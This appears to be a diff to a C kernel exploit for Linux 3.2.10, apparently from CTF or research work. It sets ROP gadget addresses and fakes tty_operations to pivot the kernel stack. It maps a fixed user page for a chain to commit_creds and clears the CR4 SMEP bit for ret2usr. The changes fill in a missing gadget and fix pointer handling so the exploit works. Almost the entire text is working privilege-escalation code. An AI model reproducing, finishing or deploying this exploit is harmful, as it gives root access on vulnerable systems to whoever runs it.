@@ -9,6 +9,8 @@
 #include<sys/ioctl.h>
 #include<errno.h>
 #include<string.h>
+#include<sys/types.h>
+#include<sys/wait.h>
 
 //auth0r: afang
 
@@ -24,10 +26,10 @@
 //define useful gadgets
 //linux version 3.2.10
 #define iretq_addr   	         (size_t)0xffffffff8158a056 //iretq for x64
-#define xchgeax_addr 	         (size_t)0 //xchg eax,esp;ret 
+#define xchgeaxesp_addr 	     (size_t)0xffffffff8107c35c //xchg eax,esp;ret 
 #define poprdi_addr  	         (size_t)0xffffffff811bfdbd //pop rdi;ret 
 #define poprdx_addr  	         (size_t)0xffffffff81286be2 //pop rdx;ret
-#define xchgebp_addr 	         (size_t)0xffffffff81805b39 //xchg ebp, esp; ret 0
+#define xchgebpesp_addr 	     (size_t)0xffffffff81805b39 //xchg ebp, esp; ret 0
 #define movrdirax_callrdx_addr   (size_t)0xffffffff8107b33b //mov rdi, rax; call rdx
 #define swapgs_addr              (size_t)0xffffffff8158a38b //swapgs
 #define poprax_addr              (size_t)0xffffffff8139c225 //pop rax ; ret
@@ -101,7 +103,7 @@ struct tty_operations {
 	const struct file_operations *proc_fops;
 };
 
-void prepare_fake_tty_operations(size_t *ptr){
+void prepare_fake_tty_operations(size_t ptr){
 
 	//this func intends for faking tty_struct + 0x18 to fake_tty_operations..
 	
@@ -109,9 +111,9 @@ void prepare_fake_tty_operations(size_t *ptr){
 	struct tty_operations *fake_ttyop = (struct tty_operations *)malloc(sizeof(struct tty_operations));
 	//memset it to zeros.
 	memset(fake_ttyop , 0, sizeof(struct tty_operations));
-	fake_ttyop->ioctl = (size_t) xchgebp_addr;
-	fake_ttyop->close = (size_t) xchgebp_addr;
-	*ptr = (size_t)fake_ttyop;	
+	fake_ttyop->ioctl = (size_t) xchgeaxesp_addr;
+	fake_ttyop->close = (size_t) xchgeaxesp_addr;
+	*(size_t *)ptr = (size_t)fake_ttyop;	
 }
 
 void prepare_tf(){
@@ -144,15 +146,16 @@ void* allocate(void *addr, size_t size){
 	printf("request allocate at : %p\n", addr);
 	printf("request size : %lu\n", size);
 
-	void *target_addr = (void*)((size_t)addr & 0xffff0000);
+	void *temp_addr   = (void*)((size_t)addr & 0xfffff000);
+	void *target_addr = (void*)(((size_t)addr & 0xfffff000) - 0x2000);
 	printf("real allocate at: %p\n", target_addr);
 
 
 	size_t *ptr = mmap((void*)target_addr, (size+0x4000), PROT_READ|PROT_WRITE, 	MAP_FIXED|MAP_PRIVATE|MAP_ANONYMOUS, -1, 0); //mmap one more 0x1000 for kernel func stack usage.
 	printf("real allocate at: %p\n", ptr);
-	printf("will return : %p\n", addr);
-	if((void*)((size_t)addr & 0xffff0000) != (void*)ptr){
-	perror("[*]There's problem ");
+	printf("will return : %p\n", temp_addr);
+	if((void*)target_addr != (void*)ptr){
+	perror("[*]There's problem allocating: ");
 	exit(-1);
 	}
 	return addr;
@@ -178,10 +181,11 @@ void usr_escalate(){
 //remote guard: 
 //smep && !smap
 //use this payload to put rop chain in designed place.
-void kernel_rop_escalate(){
+//remember to prepare_tf before kernel_rop_escalate!
+void kernel_rop_escalate(size_t target_ptr){
 
 	//mmap to target region.
-	size_t *rop_ptr = (size_t*)allocate((size_t*)target_mmap_addr, 0x1000);
+	size_t *rop_ptr = (size_t*)allocate((size_t*)target_ptr, 0x1000);
 	//now , set the rop gadgets.
 	//first , we need rop to commit_creds.
 	*rop_ptr       = (size_t)poprdi_addr;
@@ -201,10 +205,10 @@ void kernel_rop_escalate(){
 }
 
 //rop2 disable smep && ret2usr
-void kernel_rop_disable_smep(){
+void kernel_rop_disable_smep(size_t target_ptr){
 
 	printf("flip cr4 20th bit to disable smep.\n");
-	size_t *rop_ptr = (size_t*)allocate((size_t*)target_mmap_addr, 0x1000);
+	size_t *rop_ptr = (size_t*)allocate((size_t*)target_ptr, 0x1000);
 	*rop_ptr        = poprax_addr;
 	*(rop_ptr + 1)  = (size_t)0x6f0;
 	*(rop_ptr + 2)  = movcr4_poprbp_addr; 
